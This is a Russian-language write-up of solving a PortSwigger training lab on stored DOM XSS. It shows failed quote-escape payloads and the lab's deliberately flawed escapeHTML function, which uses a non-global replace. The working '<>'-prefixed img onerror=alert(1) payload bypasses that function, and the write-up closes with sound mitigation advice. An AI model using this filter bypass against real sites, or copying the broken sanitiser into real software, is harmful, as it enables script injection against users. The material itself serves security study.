лаба # Stored DOM XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

задание:
в комментах есть уязвимость Stored DOM XSS 
нужно вызвать аллерт

-------

сразу пейлоад в комментарий и в поле веб сайта
`<img src=x onerror=alert(1)>`

ответ 
это первый ответ в котором не видно ответа или отражеения пейлода в html
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6474

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Stored DOM XSS</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Stored DOM XSS</h2>
                            <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/2.jpg">
                    <h1>21st Century Dreaming</h1>
                    <p><span id=blog-author>Carrie On</span> | 29 January 2026</p>
                    <hr>
                    <p>Despite the number of differences in lifestyle between us humans, we can all have dreams with similar themes. I have very vivid dreams which appear like full-length movies. I have noticed changes as society and technology evolves.</p>
                    <p>One common dream scenario people agree on when comparing notes is the inability to scream in a dangerous situation. You open your mouth but nothing comes out. Now, instead of not being able to scream, I&apos;m unable to work my smartphone to call for help. The screen is frozen, I misdial the number, there is no signal, these are my 21st Century battles in the land of Nod. I can&apos;t help but wonder what would happen if I had a super-duper smartphone in real life, would it function better in my dreams?</p>
                    <p>Another scenario we all share is finding ourselves naked at work, walking along the street, just about anywhere inappropriate to be naked. This one holds no concerns for me now because no-one is looking at me, they&apos;re all looking at their cells and tablets. Or the vision is no longer a shock in a society where pretty much anything goes in fashion these days. As far as they&apos;re concerned I could be wearing the new invisibility clothing from Prada.</p>
                    <p>Dreams, where you lose teeth, are very common, the horror of this is so powerful, especially if it&apos;s a front tooth. But now we can all pop off to the dentist, get a temporary tooth, and have a new one drilled in at the drop of a hat. OK, it does cost a lot of money, but I&apos;d sell my house to pay for it rather than have missing teeth.</p>
                    <p>It&apos;s amazing how much technology doesn&apos;t work for me when I&apos;m dreaming (see above) and not a soul suggests turning it off and on again. Although that is quite refreshing, it builds up a new stress for 21st Century dreaming as I&apos;m left with a realization that none of it may ever work again. I wake up in a cold sweat and firstly check my cell, then boot up the PC and heave a sigh of relief that it was all just a bad dream.</p>
                    <div/>
                    <hr>
                    <h1>Comments</h1>
                    <span id='user-comments'>
                    <script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
                    <script>loadComments('/post/comment')</script>
                    </span>
                    <hr>
                    <section class="add-comment">
                        <h2>Leave a comment</h2>
                        <form action="/post/comment" method="POST" enctype="application/x-www-form-urlencoded">
                            <input required type="hidden" name="csrf" value="jU4wc9lZC5R11L8jDyLLKEGqqr4BnUiu">
                            <input required type="hidden" name="postId" value="9">
                            <label>Comment:</label>
                            <textarea required rows="12" cols="300" name="comment"></textarea>
                                    <label>Name:</label>
                                    <input required type="text" name="name">
                                    <label>Email:</label>
                                    <input required type="email" name="email">
                                    <label>Website:</label>
                                    <input pattern="(http:|https:).+" type="text" name="website">
                            <button class="button" type="submit">Post Comment</button>
                        </form>
                    </section>
                    <div class="is-linkback">
                        <a href="/">Back to Blog</a>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

но следом за этим запросом идет запрос/ответ 
который содержит json в котором уже есть мои пейлоады 
которые подставляются в код html

```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 697

[{"avatar":"","website":"","date":"2026-02-02T19:50:35.525Z","body":"PM me.","author":"Phil MaChartin"},

{"avatar":"","website":"","date":"2026-02-12T11:52:54.773Z","body":"You've inspired me to quit my job and write full time. How do I go about charging you for loss of earnings?","author":"Alan Key"},

{"avatar":"","website":"","date":"2026-02-15T09:16:20.994Z","body":"Must catch up soon.","author":"Amber Light"},{"avatar":"","website":"","date":"2026-02-24T18:51:08.756Z","body":"Did you ever watch Bloodline?","author":"Paul Totherone"},

{"avatar":"","website":"http:<img src=x onerror=alert(22)>","date":"2026-02-25T14:21:18.933544089Z","body":"<img src=x onerror=alert(1)>","author":"zheka"}]
```

то есть комменты приходят отдельным json


нужно выйти из json перед пейлоадом
видно куда подставляется пейлоад
```json
{"avatar":"",
"website":"http:<img src=x onerror=alert(22)>",
"date":"2026-02-25T14:21:18.933544089Z",
"body":"<img src=x onerror=alert(1)>",
"author":"zheka"}
```

буду в боди ставить пейлоад + выход из json
видно что оборачивается пейлоад в " кавы


пейлоад
`    "}<img src=x onerror=alert(1)>\//  `
ответ
```json
{"avatar":"",
"website":"",
"date":"2026-02-25T14:37:07.103333176Z",
"body":"\"}<img src=x onerror=alert(1)>\\//",
"author":"zheka"}
```
экранирует мои кавычки

----------

пейлоад
`    \"}<img src=x onerror=alert(1)>\//  `
ответ
```json
{"avatar":"",
"website":"",
"date":"2026-02-25T14:39:14.857897991Z",
"body":" \\\"}<img src=x onerror=alert(1)>\\//",
"author":"zheka"}
```

-------

пейлоад
`    \"}<img src=x onerror=alert(1)>\"  `
ответ
```json
{"avatar":"",
"website":"",
"date":"2026-02-25T14:40:09.804365419Z",
"body":"\\\"}<img src=x onerror=alert(1)>\\\"",
"author":"zheka"}
```

--------


пейлоад
`    \"};<img src=x onerror=alert(1)>\"  `
ответ
```json
{"avatar":"",
"website":"",
"date":"2026-02-25T14:41:49.589014767Z",
"body":"\\\"};<img src=x onerror=alert(1)>\\\" ",
"author":"zheka"}
```

чтобы  я не вводил, все экраанируется кавычками двойними

-----


обнаружил в иходном html коде интересную щтуку

```html
<script src='/resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>

<script>loadComments('/post/comment')</script>
```

путь /resources/js/loadCommentsWithVulnerableEscapeHtml.js
нужно проверить

https://0a6d00e403922afc809b03c6001c0030.web-security-academy.net/resources/js/loadCommentsWithVulnerableEscapeHtml.js


тут файл лежит 
```js
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = escapeHTML(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```

здесь функция loadComments грузит комменты с сервера

потом  функция escapeHTML находит там < > и заменяет их на кодированные

но у функции replace есть одна особенность!

она просто находит первый символ < и меняет его потом находит первый символ > и меняет его

-----

- `replace('<', '&lt;')` меняет **только первый** `<`
    
- `replace('>', '&gt;')` меняет **только первый** `>`

-----

но если много символов подряд так сделать - то она не все их сможет поменять


пейлоад
`    \"};<><img src=x onerror=alert(1)>\"  `
ответ
```json
{"avatar":"",
"website":"",
"date":"2026-02-25T14:53:33.798171373Z",
"body":"\\\"};<><img src=x onerror=alert(1)>\\\" ",
"author":"zheka"}


НО АЛЕРТ ПОЯВИЛСЯ! ТАК КАК JSON ПРОВЕРЯЕТ ФУНКЦИЯ  escapeHTML
КОТОРАЯ ИСПОЛЬЗУЕТ  replace
я дал replace сразу две скобы он их нашел и все, дальше не стал проверять!
```
а далее пейлоад пошел уже в своем боевом видео по всем инстанциям



# как пришел к решению?

1 нашел в html путь к файлу - в файле была функция в которой было ясно как работает валидация

2  там была функция которая убирает угловые скобки 
     но реализация такой функции через replace - неверное решение

3 используя уязвимость replace создал пейлоад


## как защититься от stored DOM XSS в этой лабе

никогда не использовать replace со строкой для санитизации — это основная ошибка / может можно перебор и в переборе уже реплейс посимвольно

использовать replace с регулярным выражением и флагом g для замены всех вхождений:

```js
html.replace(/</g, '&lt;').replace(/>/g, '&gt;')
```

применять проверенные библиотеки санитизации типа DOMPurify вместо самописных функций

экранировать все потенциально опасные символы перед вставкой в innerHTML

использовать textContent вместо innerHTML если нужен только текст без форматирования

не хранить пользовательский ввод в том виде в котором он был получен — применять санитизацию при сохранении

валидировать входные данные на сервере и не доверять тому что пришло от клиента

использовать Content Security Policy с ограничениями на выполнение скриптов

применять современные фреймворки которые автоматически экранируют вывод



